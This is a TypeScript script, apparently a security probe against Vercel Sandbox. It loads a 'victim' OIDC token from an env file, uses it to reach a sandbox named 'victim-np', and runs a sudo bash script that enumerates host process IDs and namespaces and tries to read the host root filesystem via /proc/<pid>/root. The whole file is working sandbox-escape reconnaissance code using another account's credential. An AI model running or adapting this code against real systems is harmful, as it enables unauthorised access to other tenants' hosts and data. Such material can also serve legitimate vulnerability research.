import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const SCRIPT = String.raw`
echo "===== pid namespace check ====="
echo "our pid ns:"; readlink /proc/self/ns/pid
echo "===== do host pids exist? ====="
for pid in 549 561 562 568 583; do
  echo "--- pid $pid ---"
  ls -la /proc/$pid 2>&1 | head -1
  cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' '; echo
  readlink /proc/$pid/ns/net 2>/dev/null
  readlink /proc/$pid/ns/mnt 2>/dev/null
  readlink /proc/$pid/ns/pid 2>/dev/null
done
echo "===== try reading host root via /proc/<pid>/root ====="
for pid in 549 561 562 568 583; do
  echo "--- /proc/$pid/root ---"
  sudo ls -la /proc/$pid/root/ 2>&1 | head -5
  sudo ls -la /proc/$pid/root/run/cell/ 2>&1 | head -10
  sudo ls -la /proc/$pid/root/etc/ 2>&1 | head -5
done
echo "===== net namespace list ====="
ls -la /proc/*/ns/net 2>/dev/null | awk '{print $9, $11}' | sort -u | head -20
echo DONE
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });